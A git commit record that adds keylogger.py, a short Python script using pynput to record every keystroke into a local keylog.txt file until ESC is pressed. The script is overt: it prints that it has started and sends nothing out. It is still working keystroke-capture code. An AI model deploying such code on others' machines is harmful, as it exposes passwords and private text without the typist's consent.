408ceb9729c81e94a2a3c9e4fca757fe4fe3a3a9
vedantikamahadik489-web <vedantikamahadik489@gmail.com>
2026-02-01 15:23:42 +0530

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,20 @@
+from pynput import keyboard
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(key.char)
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False   
+
+print("Keylogger started... Press ESC to stop.")
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
